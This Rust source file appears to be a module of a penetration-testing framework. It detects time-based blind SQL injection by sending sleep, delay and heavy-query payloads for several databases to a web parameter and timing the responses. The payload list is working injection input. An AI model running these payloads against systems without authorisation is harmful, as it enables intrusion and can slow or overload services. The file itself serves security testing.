use anyhow::Result;
use async_trait::async_trait;
use chrono::Utc;

use crate::web::{WebModule, ModuleInfo, ModuleContext, ExecutionResult};
use crate::web::injection::{InjectionConfig, InjectionEngine};

pub struct TimeSQLiModule;

impl TimeSQLiModule {
    pub fn new() -> Self {
        Self
    }
    
    fn get_payloads(&self, delay_secs: u32) -> Vec<String> {
        vec![
            // MySQL time-based
            format!("' OR SLEEP({})--", delay_secs),
            format!("' AND SLEEP({})--", delay_secs),
            format!("1' AND SLEEP({})--", delay_secs),
            format!("admin' AND SLEEP({})--", delay_secs),
            format!("' OR IF(1=1,SLEEP({}),0)--", delay_secs),
            format!("' AND IF(1=1,SLEEP({}),0)--", delay_secs),
            format!("' OR BENCHMARK(10000000,SHA1('test'))--"),
            
            // PostgreSQL time-based
            format!("' OR pg_sleep({})--", delay_secs),
            format!("' AND pg_sleep({})--", delay_secs),
            format!("1' AND pg_sleep({})--", delay_secs),
            format!("' OR (SELECT CASE WHEN (1=1) THEN pg_sleep({}) ELSE 0 END)--", delay_secs),
            
            // MSSQL time-based
            format!("'; WAITFOR DELAY '00:00:0{}'--", delay_secs),
            format!("' OR WAITFOR DELAY '00:00:0{}'--", delay_secs),
            format!("1'; WAITFOR DELAY '00:00:0{}'--", delay_secs),
            format!("'; IF (1=1) WAITFOR DELAY '00:00:0{}'--", delay_secs),
            
            // Oracle time-based
            format!("' OR DBMS_LOCK.SLEEP({})--", delay_secs),
            format!("' AND DBMS_LOCK.SLEEP({})--", delay_secs),
            format!("' OR (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP({}) ELSE NULL END FROM dual)--", delay_secs),
            
            // SQLite time-based (limited options)
            format!("' OR RANDOMBLOB({00000000})--",delay_secs * 100000000),
            format!("' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({00000000}))))--", delay_secs * 100000000),
            
            // Conditional time-based
            format!("' OR IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP({}),0)--", delay_secs),
            format!("' AND (SELECT CASE WHEN (1=1) THEN SLEEP({}) ELSE 0 END)--", delay_secs),
            format!("' AND (SELECT * FROM (SELECT(SLEEP({})))x)--", delay_secs),
            
            // Heavy query time-based
            "' OR (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)--".to_string(),
        ]
    }
}

#[async_trait]
impl WebModule for TimeSQLiModule {
    fn info(&self) -> ModuleInfo {
        ModuleInfo {
            id: "web/sqli/time".to_string(),
            name: "Time-Based Blind SQL Injection".to_string(),
            category: "SQLi".to_string(),
            description: "Time-based blind SQL injection testing. Uses database sleep functions (SLEEP, pg_sleep, WAITFOR DELAY) to detect injection by measuring response time delays.".to_string(),
            author: "CAP Framework".to_string(),
            references: vec![
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#time-based".to_string(),
                "https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays".to_string(),
            ],
        }
    }
    
    fn required_options(&self) -> Vec<String> {
        vec![
            "REQUEST (file path)".to_string(),
            "INJECTION_POINT (parameter name)".to_string(),
            "DELAY (seconds, default: 5)".to_string(),
        ]
    }
    
    async fn execute(&self, context: &ModuleContext) -> Result<ExecutionResult> {
        let request = context.request.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No request loaded"))?;
        
        let injection_point = context.injection_point.as_ref()
            .ok_or_else(|| anyhow::anyhow!("No injection point set"))?;
        
        let delay_secs: u32 = context.get_option("DELAY")
            .and_then(|s| s.parse().ok())
            .unwrap_or(5);
        
        let payloads = self.get_payloads(delay_secs);
        
        let config = InjectionConfig {
            dry_run: context.get_option("DRY_RUN").map(|s| s == "true").unwrap_or(false),
            confirm_each: context.get_option("CONFIRM_EACH").map(|s| s == "true").unwrap_or(false),
            timeout_secs: (delay_secs + 5) as u64,
            follow_redirects: false,
        };
        
        let engine = InjectionEngine::new(config)?;
        
        // Get baseline timing
        let baseline_payload = context.get_option("BASELINE").cloned()
            .unwrap_or_else(|| "BASELINE".to_string());
        
        let baseline = engine.inject_single(request, injection_point, &baseline_payload).await?;
        let baseline_time = baseline.response_time_ms;
        
        // Test time-based payloads
        let mut results = vec![baseline];
        let test_results = engine.inject_batch(request, injection_point, &payloads).await?;
        results.extend(test_results);
        
        let mut findings = Vec::new();
        let delay_ms = (delay_secs as u64) * 1000;
        let threshold_ms = baseline_time + (delay_ms * 80 / 100); // 80% of expected delay
        
        for result in &results[1..] {
            let time_diff = if result.response_time_ms > baseline_time {
                result.response_time_ms - baseline_time
            } else {
                0
            };
            
            // Check if response was delayed significantly
            if result.response_time_ms > threshold_ms {
                findings.push(format!(
                    "Time delay detected: {}ms (baseline: {}ms, expected: ~{}ms) with payload: {}",
                    result.response_time_ms,
                    baseline_time,
                    delay_ms,
                    result.payload
                ));
                
                // Identify database type from payload
                if result.payload.contains("SLEEP") {
                    findings.push("Likely MySQL/MariaDB (SLEEP function worked)".to_string());
                } else if result.payload.contains("pg_sleep") {
                    findings.push("Likely PostgreSQL (pg_sleep function worked)".to_string());
                } else if result.payload.contains("WAITFOR") {
                    findings.push("Likely MSSQL (WAITFOR DELAY worked)".to_string());
                } else if result.payload.contains("DBMS_LOCK") {
                    findings.push("Likely Oracle (DBMS_LOCK.SLEEP worked)".to_string());
                }
            }
            
            // Also check for errors that might indicate injection point
            if result.analysis.has_error_indicators {
                findings.push(format!("SQL error with time-based payload: {}", result.payload));
            }
        }
        
        if findings.is_empty() {
            findings.push(format!("No time-based SQL injection detected (baseline: {}ms, threshold: {}ms)", 
                baseline_time, threshold_ms));
        }
        
        Ok(ExecutionResult {
            success: findings.len() > 1,
            findings,
            injection_results: results,
            module_id: self.info().id,
            timestamp: Utc::now(),
        })
    }
}
